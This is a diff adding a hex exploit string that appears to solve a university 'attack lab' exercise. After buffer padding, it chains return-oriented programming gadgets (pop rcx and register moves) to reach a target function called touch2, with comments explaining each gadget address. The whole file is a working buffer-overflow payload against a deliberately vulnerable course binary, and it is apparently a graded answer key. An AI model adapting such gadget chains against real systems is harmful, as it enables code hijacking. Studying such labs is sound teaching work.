@@ -1,0 +1,25 @@
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+
+/* keep in mind that you will not jump to beginning of function, instead, jump to corresponding instruction spesific byte */
+6d 18 40 00 00 00 00 00  /* moving to pop rcx function, address is not 401869, instead it is 40186d */
+1b a2 01 35 00 00 00 00  /* value to be popped for rcx */
+57 18 40 00 00 00 00 00 /* rcx -> rax */
+20 18 40 00 00 00 00 00 /* rax -> rdi */
+50 18 40 00 00 00 00 00 /* rdi > rdx */
+64 18 40 00 00 00 00 00 /* rdx -> rsi */
+
+6d 18 40 00 00 00 00 00 /* moving again to pop rcx, swap rax, rcx function */
+1a a2 01 35 00 00 00 00
+57 18 40 00 00 00 00 00
+20 18 40 00 00 00 00 00
+18 15 40 00 00 00 00 00 /* move to touch2 */ 
